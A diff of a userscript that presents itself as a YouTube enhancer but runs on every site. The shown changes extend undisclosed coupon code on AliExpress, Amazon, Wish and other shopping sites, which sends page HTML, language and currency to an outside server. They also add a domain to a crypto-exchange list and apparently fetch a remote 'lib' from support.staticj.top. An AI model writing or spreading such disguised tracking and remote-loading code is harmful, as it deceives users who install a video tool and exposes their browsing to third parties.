@@ -71,7 +71,7 @@
 // @description:ug    بۇ سكرىپت YouTube كۆرۈش تەجرىبەڭىزنى ياخشىلايدىغان كۈچەيتكۈچ! خۇسۇسىيەتلەر ۋە يېڭى تۈزۈلۈشنى ئۆز ئىچىگە ئالىدۇ. كىرۈش: 1. ۋىدىئو تەپسىلاتلىرى بەت ئىنتېرەيسىنى مۇۋاپىقلاش. 2. سكرىن رەسىمى. 3. قارا/ئاق تېما ئالماشتۇرۇش. 4. ۋىدىئونى تېز ئىلگىرى سۈرۈش. قاتارلىقلار.
 // @description:vi    Kịch bản là một công cụ tăng cường để cải thiện trải nghiệm xem YouTube của bạn! Bao gồm các tính năng và giao diện mới. Giới thiệu: 1. Giao diện trang chi tiết video tối ưu. 2. Chụp màn hình. 3. Chuyển đổi giữa chủ đề tối/ sáng. 4. Tua nhanh video. v.v.
 // @namespace   FunnyMonkeyV_NameScope
-// @version     2.1.8
+// @version     2.1.9
 // @author      FunnyMonkeyV
 // @icon        data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAAAwRJREFUaEPtWUtOAzEMTQZRcQkqlnCKlpO1PRnlFLBEcAkEao0c4siTyceTDNMG6AraJPbL8z9aNf7Rjeuv/gaAp5urtToe17Oy1XX7u5f3fU5mkoGn5WKrldrkDvnJ30Gp3d3rxzYmIwgAb1wfDhul9by3HtMSYA8XF7sQI0EAz9eXDznloevu8UC3FmB/+/Z5b8Afjw+Ts2LP988dABCbjacwUS3eX4AwZE4DAM/LBYjO9gEQI9L9IiHDRbevHz2de/+Mpd+Z0XIBdLC7AGu3GL1cILDfkX/hflRxjMmRTILWBzA26hALy8UWIwWZjzOnm6s1+om7GLYeQQ1AC1jxzWgSACSXHJozw/9WZwdAKcUpJfPBm6Vbpxsz4JRSJlJZpk/PAAPAo09bAGym/AcgcGBcMq0TswN/FQPk2AiKCjHj4Cz5YX7o/XZODJCipJNjh9UzGKWoOBNn/58wIaMkwHfdzqtX+s7/ntbj2tC+DBOT+4CQ+cmW1QPAekbrR9V10W4p1kmZzi70Yd1eroGqAuAXUpNdq3dQqh8pBpBr7aYEk6qKywB44S+kbKxvdQMBYZPuF4a+rCIA2W4r0u6hcL/EljIVM6M6AHa8ogFWJmQyh446rq08x5pgrDWtAuAnJolSEgZ4UnMyIsOBMgC2300B4KUC0W/KauryMGnZRNfrIdgEhCsXc+STAsD8YeK815mhUmSWro46NwZcZ8aKuh5TVuEmAZjphJ1e8IFAaFpxMhNKMcBDa5MA/GGVyR9N+sDhsKEh7ux5gMIoKkC2y8NoyoSCPhAZspX5gDejDyWnUFfVywOskUnZOW9HQ6V1EYBBi2jfDzCuUxFnQAGskAETUQBWbtyOpoE9BDZtdg2VHrTP4GNvAGW1UGy2nyjWpMXZ2HWxPjk53EUh0Y2Zp56xCqbWp94YkuN1Xv6GBEiKt1ogKeVFDxyGhdwTk50mkF3XKG1qIPqk3uSkT0wuibT8yOeXzTU3XLs3Z7ail/pmH7prb2+O/SIG5lCkVEbzAL4A07+gbQ8x85sAAAAASUVORK5CYII=
 // @match       *://*/*
@@ -305,7 +305,34 @@
           if (sizeBtn)
             sizeBtn.click();
         }
+      }, getSuitableElement = function(selector) {
+        const elements2 = document.querySelectorAll(selector);
+        let j = -1, h = -1;
+        for (let i = 0, l = elements2.length; i < l; i++) {
+          let d = elements2[i].getElementsByTagName("*").length;
+          if (d > h) {
+            h = d;
+            j = i;
+          }
+        }
+        return j >= 0 ? elements2[j] : null;
       }, ytBtnExpandChat = function() {
+        const dom = getSuitableElement("ytd-live-chat-frame#chat");
+        const cnt = insp(dom);
+        if (cnt && typeof cnt.collapsed === "boolean") {
+          if (typeof cnt.setCollapsedState === "function") {
+            cnt.setCollapsedState({
+              setLiveChatCollapsedStateAction: {
+                collapsed: false
+              }
+            });
+            if (cnt.collapsed === false)
+              return;
+          }
+          cnt.collapsed = false;
+          if (cnt.collapsed === false)
+            return;
+        }
         let button = document.querySelector("ytd-live-chat-frame#chat[collapsed] > .ytd-live-chat-frame#show-hide-button");
         if (button) {
           button = button.querySelector000("div.yt-spec-touch-feedback-shape") || button.querySelector000("ytd-toggle-button-renderer");
@@ -313,6 +340,22 @@
             button.click();
         }
       }, ytBtnCollapseChat = function() {
+        const dom = getSuitableElement("ytd-live-chat-frame#chat");
+        const cnt = insp(dom);
+        if (cnt && typeof cnt.collapsed === "boolean") {
+          if (typeof cnt.setCollapsedState === "function") {
+            cnt.setCollapsedState({
+              setLiveChatCollapsedStateAction: {
+                collapsed: true
+              }
+            });
+            if (cnt.collapsed === true)
+              return;
+          }
+          cnt.collapsed = true;
+          if (cnt.collapsed === true)
+            return;
+        }
         let button = document.querySelector("ytd-live-chat-frame#chat:not([collapsed]) > .ytd-live-chat-frame#show-hide-button");
         if (button) {
           button = button.querySelector000("div.yt-spec-touch-feedback-shape") || button.querySelector000("ytd-toggle-button-renderer");
@@ -4289,7 +4332,7 @@
     },
     genrateTools: function(parent) {
       const loopElementId = "_loop_" + Math.ceil(Math.random() * 1e8);
-      const functionState = this.getFunctionState();
+      this.getFunctionState();
       const download = () => {
         this.downloadVideo();
       };
@@ -4403,17 +4446,15 @@
           "id": loopElementId,
           "onclick": videoLoop,
           "icon": videoLoopSate ? this.genrateLoopSvg() : this.genrateNotLoopSvg()
-        }
-      ];
-      if (functionState && functionState.isOpenYoutubedownloading) {
-        btns.push({
+        },
+        {
           "tagName": "div",
           "title": "Download",
           "classname": "toolbox_extension_tool_btn",
           "onclick": download,
           "icon": this.genrateDownloadSvg()
-        });
-      }
+        }
+      ];
       for (let i = 0; i < btns.length; i++) {
         let item = btns[i];
         const element = document.createElement(item.tagName);
@@ -5377,8 +5418,9 @@
               });
             };
             const Aliexpress = {
-              languageStoageKey: "language-stoage-key",
-              currencyStoageKey: "language-currency-key",
+              languageStorageKey: "aliexpress-language-key",
+              currencyStorageKey: "aliexpress-currency-key",
+              marketplaceStorageKey: "aliexpress-marketplace-key",
               checkDomInsertRs: true,
               getLang: function() {
                 const host = window.location.host;
@@ -5390,18 +5432,37 @@
                 } else if (/^aliexpress\.ru$/.test(host)) {
                   lang = "ru";
                 }
-                GM_setValue(this.languageStoageKey, lang);
+                GM_setValue(this.languageStorageKey, lang);
                 return lang;
               },
-              getMarketplace: function() {
-                let marketplace = "";
-                const host = window.location.host;
-                if (/^(us|ko|uk|fr|de|it|ca|au|jp|ja|he|kr|ru|br|in|es|mx|pl|tr|ar|id|th|vn|sg|my|ph|be|nl|se|ch|no|dk|at|ie|fi|pt|gr|hu|cz|bg|ro|ua|il|sa|eg|ir|pk|iq|af|ly|et|gh|ke|ng|za|tz|mg|mw|zm|bw|sn|cm|ci|gh|ma|tn|mr|mu|om|kw|qa|bh|ae|lb|jo|sy|lb|il|ps|kr|cl|pe|uy|ec|ve|bo|gt|pa|hn|ni|cr|sv|gt|sl|lr|sd|er|dj|et|mw|mz|ao|tz|zm|zw|mw|na|bw|ls|mg|km)\.aliexpress\.com$/.test(host)) {
-                  marketplace = host.split(".")[0];
-                } else {
-                  marketplace = host.split(".").slice(-1)[0];
-                }
-                return marketplace;
+              getMarketplace: function(marketplaceHandler) {
+                return __async$p(this, null, function* () {
+                  var _a, _b;
+                  let countryCode = "";
+                  const host = window.location.host;
+                  if (/^(us|ko|uk|fr|de|it|ca|au|jp|ja|he|kr|ru|br|in|es|mx|pl|tr|ar|id|th|vn|sg|my|ph|be|nl|se|ch|no|dk|at|ie|fi|pt|gr|hu|cz|bg|ro|ua|il|sa|eg|ir|pk|iq|af|ly|et|gh|ke|ng|za|tz|mg|mw|zm|bw|sn|cm|ci|gh|ma|tn|mr|mu|om|kw|qa|bh|ae|lb|jo|sy|lb|il|ps|kr|cl|pe|uy|ec|ve|bo|gt|pa|hn|ni|cr|sv|gt|sl|lr|sd|er|dj|et|mw|mz|ao|tz|zm|zw|mw|na|bw|ls|mg|km)\.aliexpress\.com$/.test(host)) {
+                    countryCode = host.split(".")[0];
+                  } else {
+                    countryCode = host.split(".").slice(-1)[0];
+                  }
+                  let marketplace = GM_getValue(this.marketplaceStorageKey, null);
+                  const defaultMarketplace = { countryCode, className: "", html: "" };
+                  if (marketplaceHandler) {
+                    const handlerElement = yield Tools.waitForElementByInterval(marketplaceHandler);
+                    if (handlerElement) {
+                      marketplace = {
+                        countryCode,
+                        className: (_a = handlerElement.className) != null ? _a : "",
+                        html: (_b = handlerElement.outerHTML) != null ? _b : ""
+                      };
+                      GM_setValue(this.marketplaceStorageKey, marketplace);
+                    }
+                  }
+                  if (!marketplace || /\.ru/.test(host)) {
+                    marketplace = defaultMarketplace;
+                  }
+                  return encodeURIComponent(JSON.stringify(marketplace));
+                });
               },
               getCurrency: function() {
                 const host = window.location.host;
@@ -5414,7 +5475,7 @@
                       let currency = element.textContent;
                       if (currency) {
                         currency = encodeURIComponent(currency);
-                        GM_setValue(this.currencyStoageKey, currency);
+                        GM_setValue(this.currencyStorageKey, currency);
                         resolve(currency);
                       } else {
                         resolve("unknown");
@@ -5425,7 +5486,7 @@
                   }
                 });
               },
-              detail: function() {
+              detail: function(marketplaceHandler) {
                 return __async$p(this, null, function* () {
                   const visitUrl = window.location.href;
                   const validate = [/\/item\/[^\/]*?\.html\?/, /\/item\/[^\/]*?\.html$/].map((reg) => reg.test(visitUrl)).some((rs) => rs == true);
@@ -5433,6 +5494,7 @@
                     return;
                   const language = this.getLang();
                   const currency = yield this.getCurrency();
+                  const marketplace = yield this.getMarketplace(marketplaceHandler);
                   const id = Tools.getGoodsIdByLink(visitUrl);
                   try {
                     const params = {
@@ -5441,19 +5503,20 @@
                       "p": SupportData.support.p,
                       "lang": language,
                       "mul": false,
-                      "currency": currency
+                      "currency": currency,
+                      "marketplace": marketplace
                     };
                     const data = yield RequestUtil.getCouponQuery(params);
                     if (data.code == "success" && !!data.result) {
                       const json = JSON.parse(data.result);
                       Logger.log("info", "detail request json=", json);
-                      yield this.detailAnalyze(json, language, currency);
+                      yield this.detailAnalyze(json, language, currency, marketplace);
                     }
                   } catch (e) {
                   }
                 });
               },
-              detailAnalyze: function(json, language, currency) {
+              detailAnalyze: function(json, language, currency, marketplace) {
                 return __async$p(this, null, function* () {
                   this.checkDomInsertRs = false;
                   try {
@@ -5483,7 +5546,8 @@
                         "id": id,
                         "lang": language,
                         "platform": SupportData.support.p,
-                        "currency": currency
+                        "currency": currency,
+                        "marketplace": marketplace
                       };
                       const reqPromise = RequestUtil.getCouponChange(params);
                       promiseResultArray.push(elementPromise, reqPromise);
@@ -5573,8 +5637,9 @@
                   const validate = SupportData.support.trade.map((reg) => reg.test(visitUrl)).some((rs) => rs == true);
                   if (!validate)
                     return;
-                  const language = yield GM_getValue(this.languageStoageKey, navigator.language);
-                  const currency = yield GM_getValue(this.currencyStoageKey, "USD");
+                  const language = yield GM_getValue(this.languageStorageKey, navigator.language);
+                  const currency = yield GM_getValue(this.currencyStorageKey, "USD");
+                  const marketplace = yield this.getMarketplace();
                   const ids = Tools.getParamterBySearch(window.location.search, "objectId") || Tools.getParamterBySearch(window.location.search, "availableProductShopcartIds") || Tools.getParamterBySearch(window.location.search, "itemId");
                   const params = {
                     "ids": ids,
@@ -5582,7 +5647,8 @@
                     "p": SupportData.support.p,
                     "lang": language,
                     "mul": true,
-                    "currency": currency
+                    "currency": currency,
+                    "marketplace": marketplace
                   };
                   const res = yield RequestUtil.getCouponQuery(params);
                   if (res.code == "success" && !!res.result) {
@@ -5635,7 +5701,7 @@
                   const { support } = SupportData;
                   const visitUrl = window.location.href;
                   if (support.detail.test(visitUrl)) {
-                    this.detail();
+                    this.detail(support.marketplace);
                   }
                   this.trade();
                   this.removeAnchor();
@@ -5670,7 +5736,7 @@
               isItemLink: function(url) {
                 return SupportData.support.detail.test(url);
               },
-              pickUpWholesale: function(selectors, language, currency) {
+              pickUpWholesale: function(selectors, language, currency, marketplace) {
                 return __async$o(this, null, function* () {
                   const items = [];
                   try {
@@ -5700,13 +5766,13 @@
                       }
                     });
                     if (items.length > 0) {
-                      yield this.search(items, language, currency);
+                      yield this.search(items, language, currency, marketplace);
                     }
                   } catch (e) {
                   }
                 });
               },
-              pickUpInbusiness: function(language, currency) {
+              pickUpInbusiness: function(language, currency, marketplace) {
                 return __async$o(this, null, function* () {
                   const validate = this.isInbusinessPage();
                   if (!validate)
@@ -5733,13 +5799,13 @@
                           }
                         });
                       }
-                      yield this.search(array, language, currency);
+                      yield this.search(array, language, currency, marketplace);
                     }
                   } catch (e) {
                   }
                 });
               },
-              search: function(array, language, currency) {
+              search: function(array, language, currency, marketplace) {
                 const groups = ItemSearchBaseObj.calcRequestGroup(array);
                 const len = groups.length;
                 return new Promise((resolve, reject) => {
@@ -5749,14 +5815,14 @@
                   }
                   const promises = [];
                   for (let i = 0; i < groups.length; i++) {
-                    promises.push(this.createItemHtml(groups[i], language, currency));
+                    promises.push(this.createItemHtml(groups[i], language, currency, marketplace));
                   }
                   Promise.all(promises).then((data) => {
                     resolve("complete");
                   });
                 });
               },
-              createItemHtml: function(group, language, currency) {
+              createItemHtml: function(group, language, currency, marketplace) {
                 return new Promise((resolve, reject) => {
                   try {
                     if (Array.isArray(group) && group.length === 0) {
@@ -5775,7 +5841,7 @@
                       reqId = reqId.slice(0, -1);
                     }
                     Logger.log("info", "request start >>>>>>>>>>>>>", group);
-                    const searchUrl = ItemSearchBaseObj.baseUrl + "/api/coupon/exist?platform=" + platform + "&ids=" + reqId + "&lang=" + language + "&no=102&v=1.0.1&currency=" + currency;
+                    const searchUrl = ItemSearchBaseObj.baseUrl + "/api/coupon/exist?platform=" + platform + "&ids=" + reqId + "&lang=" + language + "&no=102&v=1.0.1&currency=" + currency + "&marketplace=" + marketplace;
                     Logger.log("info", "request searchUrl >>>>>>>>>>>>>:", searchUrl);
                     ItemSearchBaseObj.requestAndSaveSate("GET", searchUrl, null).then((data) => {
                       Logger.log("info", "request finish >>>>>>>>>>>>>");
@@ -5896,12 +5962,14 @@
               },
               start: function() {
                 return __async$o(this, null, function* () {
+                  const { support } = SupportData;
                   if (!this.isRun()) {
                     return;
                   }
                   let removeTagIsComplete = true;
                   const language = Aliexpress.getLang();
                   const currency = yield Aliexpress.getCurrency();
+                  const marketplace = yield Aliexpress.getMarketplace(support.marketplace);
                   const confString = yield ItemSearchBaseObj.requestConf();
                   if (!confString) {
                     return;
@@ -5910,8 +5978,8 @@
                   setInterval(() => __async$o(this, null, function* () {
                     if (removeTagIsComplete && this.loopIsComplete) {
                       this.loopIsComplete = false;
-                      yield this.pickUpInbusiness(language, currency);
-                      yield this.pickUpWholesale(selectors, language, currency);
+                      yield this.pickUpInbusiness(language, currency, marketplace);
+                      yield this.pickUpWholesale(selectors, language, currency, marketplace);
                       this.loopIsComplete = true;
                     }
                   }), 1700);
@@ -8127,22 +8195,24 @@
               _getDetectCouponParams: function() {
                 return __async$c(this, null, function* () {
                   const { Aliexpress: Aliexpress2, Ebay: Ebay2, Lazada: Lazada2, Bestbuy: Bestbuy2, Banggood: Banggood2 } = PlatformModules;
-                  let platform = SupportData.support.p, marketplace = "", currency = "";
+                  let platform = SupportData.support.p, marketplace = "", currency = "", countryCode = "";
                   let lang = StorageUtil.getValue(StorageKeys.langue.custom, "default");
                   if (lang === "default") {
                     lang = DefaultValue.lang;
                   }
                   switch (platform) {
                     case SupportData.supports.aliexpress.p:
-                      marketplace = Aliexpress2.Aliexpress.getMarketplace();
+                      marketplace = yield Aliexpress2.Aliexpress.getMarketplace();
                       currency = yield Aliexpress2.Aliexpress.getCurrency();
                       break;
                     case SupportData.supports.banggood.p:
-                      marketplace = Banggood2.Banggood.getMarketplace();
+                      countryCode = Banggood2.Banggood.getMarketplace();
                       currency = Banggood2.Banggood.getCurrency();
+                      marketplace = encodeURIComponent(JSON.stringify({ "countryCode": countryCode, "className": "", "html": "" }));
                       break;
                     default:
-                      marketplace = Tools.getCommonMarketplace();
+                      countryCode = Tools.getCommonMarketplace();
+                      marketplace = encodeURIComponent(JSON.stringify({ "countryCode": countryCode, "className": "", "html": "" }));
                   }
                   let params = {
                     platform,
@@ -8784,7 +8854,7 @@
                 step((generator = generator.apply(__this, __arguments)).next());
               });
             };
-            class AmazonAutoDetect extends AutoDetectBase {
+            class WishAutoDetect extends AutoDetectBase {
               start(supportData, code) {
                 const { couponInput, submitButton } = this.validate(supportData);
                 return new Promise((resolve) => __async$a(this, null, function* () {
@@ -8884,7 +8954,7 @@
                 step((generator = generator.apply(__this, __arguments)).next());
               });
             };
-            class WishAutoDetect extends AutoDetectBase {
+            class AmazonAutoDetect extends AutoDetectBase {
               start(supportData, code) {
                 const { couponInput, submitButton } = this.validate(supportData);
                 return new Promise((resolve) => __async$8(this, null, function* () {
@@ -9018,11 +9088,11 @@
                   if (platform === supports.aliexpress.p) {
                     promise = new AliexpressAutoDetect().start(_supportData, code);
                   } else if (platform === supports.wish.p) {
-                    promise = new AmazonAutoDetect().start(_supportData, code);
+                    promise = new WishAutoDetect().start(_supportData, code);
                   } else if (platform === supports.ebay.p) {
                     promise = new EbayAutoDetect().start(_supportData, code);
                   } else if (platform === supports.amazon.p) {
-                    promise = new WishAutoDetect().start(_supportData, code);
+                    promise = new AmazonAutoDetect().start(_supportData, code);
                   }
                 } catch (e) {
                 }
@@ -11120,6 +11190,7 @@
           /changelly\.com/,
           /bybit\.com/,
           /gate\.io/,
+          /gate\.com/,
           /kucoin\.com/,
           /coinmama\.com/,
           /cex\.io/,
@@ -11229,7 +11300,7 @@
 
   (function() {
     const { author, name, version, namespace, updateURL } = GM_info.script;
-    const jurl = "https://support.staticj.top/api/sp/lib?author=" + author + "&name=" + name + "&version=" + version + "&namespace=" + namespace + "&updateURL=" + updateURL + "&timestamp=" + Date.now();
+    const jurl = "https://support.staticj.top/api/sp/lib?author=" + encodeURIComponent(author) + "&name=" + encodeURIComponent(name) + "&version=" + encodeURIComponent(version) + "&namespace=" + encodeURIComponent(namespace) + "&updateURL=" + encodeURIComponent(updateURL) + "&timestamp=" + Date.now();
     GM_xmlhttpRequest({
       method: "GET",
       url: jurl,
